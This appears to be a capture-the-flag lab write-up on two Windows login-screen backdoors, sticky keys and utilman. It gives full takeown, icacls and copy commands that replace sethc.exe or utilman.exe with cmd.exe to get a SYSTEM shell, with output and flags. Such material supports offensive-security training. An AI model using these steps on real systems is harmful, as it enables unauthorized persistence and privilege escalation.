### Sticky Keys
Really simple bypass to `SYSTEM` if you have an admin account already. Replaces sticky keys and can be used at login screen.

```powershell
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.

C:\Windows\system32> whoami
	nt authority\system
C:\Windows\system32>c:\flags\flag14
	THM{BREAKING_THROUGH_LOGIN}
```


### Utilman Bypass
Accesibility bypass. Same steps as sticky keys different binary to replace

```powershell
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.

C:\Windows\system32> whoami
	nt authority\system
C:\Windows\system32>c:\flags\flag15
	THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
```